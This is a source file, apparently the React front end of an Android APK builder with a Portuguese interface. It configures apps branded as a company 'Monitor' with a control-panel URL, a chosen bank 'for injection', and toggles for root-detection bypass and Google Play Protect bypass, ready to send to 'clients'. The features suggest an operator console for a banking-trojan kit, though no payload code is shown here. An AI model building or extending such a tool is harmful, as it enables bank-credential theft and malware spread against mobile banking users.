import { useState, useEffect } from 'react';
import { trpc } from '@/lib/trpc';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Checkbox } from '@/components/ui/checkbox';
import { Card } from '@/components/ui/card';
import { Alert, AlertDescription } from '@/components/ui/alert';
import { Loader2, Download, CheckCircle, AlertCircle, Shield, ShieldCheck } from 'lucide-react';
import MainLayout from '@/components/MainLayout';
import { BANKS_BY_COUNTRY, COUNTRIES_SORTED, getBanksByCountry, getBankById } from '../../../shared/banks';
import { buildPackageName, sanitizeAppName, toOptionalValidLogoUrl, toRequiredValidUrl, type DeliveryMode } from '@/lib/apk-builder';

export default function APKGenerator() {
  const [companyName, setCompanyName] = useState('FazTudo');
  const [companyUrl, setCompanyUrl] = useState('https://faztudo.com.br');
  const [logoUrl, setLogoUrl] = useState('');
  const [versionName, setVersionName] = useState('1.0.0');
  const [versionCode, setVersionCode] = useState(1);
  const [selectedCountry, setSelectedCountry] = useState('Brasil');
  const [selectedBankId, setSelectedBankId] = useState('bb');
  const [enableRootBypass, setEnableRootBypass] = useState(true);
  const [enablePlayProtectBypass, setEnablePlayProtectBypass] = useState(true);
  const [deliveryMode, setDeliveryMode] = useState<DeliveryMode>('auto');
  const [loading, setLoading] = useState(false);
  const [buildId, setBuildId] = useState<string | null>(null);
  const [downloadUrl, setDownloadUrl] = useState<string | null>(null);
  const [artifactSource, setArtifactSource] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [progress, setProgress] = useState(0);

  const generateAPK = trpc.apk.generate.useMutation();
  const recentBuilds = trpc.apk.listRecent.useQuery(undefined, { refetchInterval: 5000 });
  const capabilities = trpc.apk.capabilities.useQuery();
  const checkBuildStatus = trpc.apk.status.useQuery(
    { buildId: buildId || '' },
    { enabled: !!buildId && !downloadUrl, refetchInterval: 2000 }
  );

  useEffect(() => {
    if (checkBuildStatus.data?.status === 'completed' && checkBuildStatus.data?.downloadUrl) {
      setDownloadUrl(checkBuildStatus.data.downloadUrl);
      setArtifactSource(checkBuildStatus.data.artifactSource ?? null);
      setProgress(100);
    } else if (checkBuildStatus.data?.status === 'building') {
      setProgress(50);
    }
  }, [checkBuildStatus.data]);

  const handleGenerateAPK = async () => {
    setError(null);

    if (!companyName.trim()) {
      setError('Por favor, insira o nome da empresa');
      return;
    }

    if (!companyUrl.trim()) {
      setError('Por favor, insira a URL da empresa');
      return;
    }

    const selectedBank = getBankById(selectedBankId);
    if (!selectedBank) {
      setError('Por favor, selecione um banco válido');
      return;
    }

    setLoading(true);
    setProgress(10);

    try {
      const normalizedPanelUrl = toRequiredValidUrl(companyUrl);
      const normalizedLogoUrl = toOptionalValidLogoUrl(logoUrl);
      const appName = sanitizeAppName(`${companyName} Monitor`);

      if (!normalizedPanelUrl) {
        setError('A URL do painel e invalida. Exemplo valido: https://painel.suaempresa.com');
        setLoading(false);
        return;
      }

      const result = await generateAPK.mutateAsync({
        panelUrl: normalizedPanelUrl,
        appName,
        packageName: buildPackageName(companyName),
        versionName,
        versionCode,
        bankId: selectedBank.id,
        bankCountry: selectedBank.country,
        bankName: selectedBank.name,
        logoUrl: normalizedLogoUrl,
        enableRootBypass,
        enablePlayProtectBypass,
        deliveryMode,
      });

      if (result.buildId) {
        setBuildId(result.buildId);
        setProgress(30);
      }
    } catch (err) {
      setError('Não foi possível iniciar a geração do APK');
    } finally {
      setLoading(false);
    }
  };

  if (downloadUrl) {
    return (
      <MainLayout>
        <div className="max-w-2xl mx-auto">
          <div className="text-center mb-8">
            <CheckCircle className="w-16 h-16 text-cyan-400 mx-auto mb-4" />
            <h1 className="text-3xl font-bold text-cyan-300 mb-2">APK Gerado com Sucesso! ✅</h1>
            <p className="text-slate-300 mb-6">Seu APK está pronto para download</p>
          </div>

          <Card className="bg-slate-800/50 border-cyan-400/20 p-8 text-center">
            {artifactSource && (
              <p className="text-slate-400 text-xs mb-4">Fonte do artefato: {artifactSource}</p>
            )}

            {(artifactSource === 'github' || artifactSource === 'local') && (
              <Alert className="mb-6 bg-amber-900/20 border-amber-500/50 text-left">
                <AlertCircle className="w-4 h-4 text-amber-300" />
                <AlertDescription className="text-amber-200">
                  Este APK parece ser estatico (fonte {artifactSource}). Ele pode ignorar a URL do painel informada no gerador.
                  Gere um APK com variaveis de ambiente no build (EAS/Android Studio) para apontar para o painel correto.
                </AlertDescription>
              </Alert>
            )}

            <a
              href={downloadUrl}
              download
              className="inline-flex items-center gap-2 bg-gradient-to-r from-blue-600 to-cyan-600 hover:from-blue-700 hover:to-cyan-700 text-white font-bold py-3 px-8 rounded-lg transition-all"
            >
              <Download className="w-5 h-5" />
              Baixar APK
            </a>
            <p className="text-slate-400 mt-6 text-sm">APK pronto para envio ao cliente.</p>
          </Card>

          <Button
            onClick={() => {
              setDownloadUrl(null);
              setArtifactSource(null);
              setBuildId(null);
              setProgress(0);
            }}
            variant="outline"
            className="w-full mt-6 border-cyan-400/30 text-cyan-300 hover:bg-slate-700/50"
          >
            Gerar Outro APK
          </Button>
        </div>
      </MainLayout>
    );
  }

  return (
    <MainLayout>
      <div className="max-w-2xl mx-auto">
        <div className="mb-8">
          <h1 className="text-3xl font-bold text-cyan-300 mb-2">🔨 APK Builder</h1>
          <p className="text-slate-300">Crie seu APK customizado em poucos cliques</p>
        </div>

        {error && (
          <Alert className="mb-6 bg-red-900/20 border-red-500/50">
            <AlertCircle className="w-4 h-4 text-red-400" />
            <AlertDescription className="text-red-300">{error}</AlertDescription>
          </Alert>
        )}

        <Card className="bg-slate-800/50 border-cyan-400/20 p-8 mb-6">
          <div className="space-y-6">
            {/* Company Info Section */}
            <div className="border-b border-cyan-400/20 pb-6">
              <h2 className="text-lg font-bold text-cyan-300 mb-4">Informações da Empresa</h2>

              <div className="space-y-4">
                <div>
                  <label className="block text-sm font-semibold text-cyan-300 mb-2">
                    Nome da Empresa *
                  </label>
                  <Input
                    value={companyName}
                    onChange={(e) => setCompanyName(e.target.value)}
                    placeholder="Ex: FazTudo"
                    className="bg-slate-700/50 border-cyan-400/30 text-white"
                    disabled={loading || !!buildId}
                  />
                </div>

                <div>
                  <label className="block text-sm font-semibold text-cyan-300 mb-2">
                    URL da Empresa *
                  </label>
                  <Input
                    value={companyUrl}
                    onChange={(e) => setCompanyUrl(e.target.value)}
                    placeholder="Ex: painel.suaempresa.com"
                    className="bg-slate-700/50 border-cyan-400/30 text-white"
                    disabled={loading || !!buildId}
                  />
                  <p className="text-xs text-slate-500 mt-1">Se nao comecar com http/https, o sistema adiciona https:// automaticamente.</p>
                </div>

                <div>
                  <label className="block text-sm font-semibold text-cyan-300 mb-2">
                    Logo da Empresa (URL)
                  </label>
                  <Input
                    value={logoUrl}
                    onChange={(e) => setLogoUrl(e.target.value)}
                    placeholder="Ex: https://faztudo.com.br/logo.png"
                    className="bg-slate-700/50 border-cyan-400/30 text-white"
                    disabled={loading || !!buildId}
                  />
                </div>
              </div>
            </div>

            {/* Bank Selection Section */}
            <div className="border-b border-cyan-400/20 pb-6">
              <h2 className="text-lg font-bold text-cyan-300 mb-4">Configurações de Banco</h2>

              <div className="space-y-4">
                <div>
                  <label className="block text-sm font-semibold text-cyan-300 mb-2">
                    País do Banco *
                  </label>
                  <Select
                    value={selectedCountry}
                    onValueChange={(value) => {
                      setSelectedCountry(value);
                      const banksInCountry = getBanksByCountry(value);
                      if (banksInCountry.length > 0) {
                        setSelectedBankId(banksInCountry[0].id);
                      }
                    }}
                    disabled={loading || !!buildId}
                  >
                    <SelectTrigger className="bg-slate-700/50 border-cyan-400/30 text-white">
                      <SelectValue placeholder="Selecione o país" />
                    </SelectTrigger>
                    <SelectContent className="bg-slate-800 border-cyan-400/30">
                      {COUNTRIES_SORTED.map((country) => (
                        <SelectItem key={country} value={country} className="text-white hover:bg-slate-700">
                          {country}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>

                <div>
                  <label className="block text-sm font-semibold text-cyan-300 mb-2">
                    Banco para Injeção *
                  </label>
                  <Select
                    value={selectedBankId}
                    onValueChange={setSelectedBankId}
                    disabled={loading || !!buildId}
                  >
                    <SelectTrigger className="bg-slate-700/50 border-cyan-400/30 text-white">
                      <SelectValue placeholder="Selecione o banco" />
                    </SelectTrigger>
                    <SelectContent className="bg-slate-800 border-cyan-400/30">
                      {getBanksByCountry(selectedCountry).map((bank) => (
                        <SelectItem key={bank.id} value={bank.id} className="text-white hover:bg-slate-700">
                          {bank.name}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>

                <div className="space-y-3">
                  <div className="flex items-center space-x-3">
                    <Checkbox
                      id="root-bypass"
                      checked={enableRootBypass}
                      onCheckedChange={(checked) => setEnableRootBypass(checked === true)}
                      disabled={loading || !!buildId}
                      className="border-cyan-400/30 data-[state=checked]:bg-cyan-400 data-[state=checked]:border-cyan-400"
                    />
                    <label htmlFor="root-bypass" className="flex items-center space-x-2 text-sm font-medium text-slate-300">
                      <Shield className="w-4 h-4 text-cyan-400" />
                      <span>Bypass Root Completo</span>
                    </label>
                  </div>

                  <div className="flex items-center space-x-3">
                    <Checkbox
                      id="play-protect-bypass"
                      checked={enablePlayProtectBypass}
                      onCheckedChange={(checked) => setEnablePlayProtectBypass(checked === true)}
                      disabled={loading || !!buildId}
                      className="border-cyan-400/30 data-[state=checked]:bg-cyan-400 data-[state=checked]:border-cyan-400"
                    />
                    <label htmlFor="play-protect-bypass" className="flex items-center space-x-2 text-sm font-medium text-slate-300">
                      <ShieldCheck className="w-4 h-4 text-cyan-400" />
                      <span>Bypass Google Play Protect</span>
                    </label>
                  </div>
                </div>
              </div>
            </div>

            {/* Preview Section */}
            <div className="border-b border-cyan-400/20 pb-6">
              <h2 className="text-lg font-bold text-cyan-300 mb-4">Prévia do App</h2>
              <div className="bg-slate-700/30 rounded-lg p-6 text-center">
                {logoUrl && (
                  <img
                    src={logoUrl}
                    alt="Logo"
                    className="w-16 h-16 mx-auto mb-4 rounded-lg"
                    onError={() => setLogoUrl('')}
                  />
                )}
                <p className="text-cyan-300 font-bold text-lg">{companyName} Monitor</p>
                <p className="text-slate-400 text-sm mt-2">{companyUrl}</p>
              </div>
            </div>

            {/* Build Status */}
            {buildId && !downloadUrl && (
              <div className="border-b border-cyan-400/20 pb-6">
                <h2 className="text-lg font-bold text-cyan-300 mb-4">Status da Compilação</h2>
                <div className="space-y-4">
                  <div className="w-full bg-slate-700/50 rounded-full h-2">
                    <div
                      className="bg-gradient-to-r from-blue-600 to-cyan-600 h-2 rounded-full transition-all duration-500"
                      style={{ width: `${progress}%` }}
                    ></div>
                  </div>
                  <p className="text-slate-300 text-sm text-center">
                    {progress < 50 && 'Iniciando compilação...'}
                    {progress >= 50 && progress < 100 && 'Compilando APK...'}
                    {progress === 100 && 'Concluído!'}
                  </p>
                </div>
              </div>
            )}

            {/* Build Button */}
            <div>
              <label className="block text-sm font-semibold text-cyan-300 mb-2">
                Fonte do Link APK
              </label>
              <Select
                value={deliveryMode}
                onValueChange={(value) => setDeliveryMode(value as DeliveryMode)}
                disabled={loading || !!buildId}
              >
                <SelectTrigger className="bg-slate-700/50 border-cyan-400/30 text-white">
                  <SelectValue placeholder="Selecione a fonte" />
                </SelectTrigger>
                <SelectContent className="bg-slate-800 border-cyan-400/30">
                  <SelectItem value="auto" className="text-white hover:bg-slate-700">Automatico (EAS -&gt; Storage -&gt; Local)</SelectItem>
                  <SelectItem value="eas" className="text-white hover:bg-slate-700">EAS</SelectItem>
                  <SelectItem value="storage" className="text-white hover:bg-slate-700">Storage</SelectItem>
                  <SelectItem value="local" className="text-white hover:bg-slate-700">Local (fallback)</SelectItem>
                </SelectContent>
              </Select>
            </div>

            <Button
              onClick={handleGenerateAPK}
              disabled={loading || !!buildId}
              className="w-full bg-gradient-to-r from-blue-600 to-cyan-600 hover:from-blue-700 hover:to-cyan-700 text-white font-bold py-3 text-lg"
            >
              {loading || buildId ? (
                <>
                  <Loader2 className="w-5 h-5 mr-2 animate-spin" />
                  {loading ? 'Iniciando...' : 'Compilando...'}
                </>
              ) : (
                '▶ Build APK'
              )}
            </Button>
          </div>
        </Card>

        <Alert className="bg-blue-900/20 border-blue-500/50">
          <AlertCircle className="w-4 h-4 text-blue-400" />
          <AlertDescription className="text-blue-300">
            Após gerar o APK, você poderá compartilhar o link de download com seus clientes
          </AlertDescription>
        </Alert>

        <Card className="bg-slate-800/50 border-cyan-400/20 p-6 mt-6">
          <h2 className="text-lg font-bold text-cyan-300 mb-4">Disponibilidade das Opcoes</h2>
          <div className="grid md:grid-cols-3 gap-3 text-sm">
            <div className="rounded-lg border border-cyan-400/20 p-3 bg-slate-900/30">
              <p className="text-slate-200 font-semibold">EAS</p>
              <p className={capabilities.data?.eas.available ? 'text-green-300' : 'text-red-300'}>
                {capabilities.data?.eas.available ? 'Configurado' : 'Nao configurado'}
              </p>
            </div>
            <div className="rounded-lg border border-cyan-400/20 p-3 bg-slate-900/30">
              <p className="text-slate-200 font-semibold">Storage</p>
              <p className={capabilities.data?.storage.available ? 'text-green-300' : 'text-red-300'}>
                {capabilities.data?.storage.available ? 'Configurado' : 'Nao configurado'}
              </p>
            </div>
            <div className="rounded-lg border border-cyan-400/20 p-3 bg-slate-900/30">
              <p className="text-slate-200 font-semibold">Local</p>
              <p className="text-green-300">Disponivel</p>
            </div>
          </div>
        </Card>

        <Card className="bg-slate-800/50 border-cyan-400/20 p-6 mt-6">
          <h2 className="text-lg font-bold text-cyan-300 mb-4">Historico de Builds</h2>

          {recentBuilds.isLoading && (
            <p className="text-slate-400 text-sm">Carregando builds recentes...</p>
          )}

          {recentBuilds.isError && (
            <p className="text-red-300 text-sm">Nao foi possivel carregar o historico de builds.</p>
          )}

          {!recentBuilds.isLoading && !recentBuilds.isError && (recentBuilds.data?.length ?? 0) === 0 && (
            <p className="text-slate-400 text-sm">Nenhum build recente encontrado.</p>
          )}

          <div className="space-y-3">
            {recentBuilds.data?.map((build) => (
              <div
                key={build.id}
                className="border border-cyan-400/20 rounded-lg p-3 bg-slate-900/30 flex flex-col md:flex-row md:items-center md:justify-between gap-3"
              >
                <div>
                  <p className="text-slate-200 font-semibold">{build.appName}</p>
                  <p className="text-slate-400 text-xs">ID: {build.id}</p>
                  <p className="text-slate-500 text-xs">
                    {new Date(build.createdAt).toLocaleString('pt-BR')}
                  </p>
                </div>

                <div className="flex items-center gap-2">
                  <span className="text-xs px-2 py-1 rounded bg-slate-700/60 text-slate-200">
                    {build.status} ({build.progress}%)
                  </span>

                  <span className="text-xs px-2 py-1 rounded bg-blue-900/40 text-blue-200">
                    {build.artifactSource ? `fonte: ${build.artifactSource}` : 'fonte: pendente'}
                  </span>

                  {build.downloadUrl && (
                    <a
                      href={build.downloadUrl}
                      className="text-xs bg-cyan-600 hover:bg-cyan-700 text-white px-3 py-1.5 rounded"
                    >
                      Download
                    </a>
                  )}
                </div>
              </div>
            ))}
          </div>
        </Card>
      </div>
    </MainLayout>
  );
}
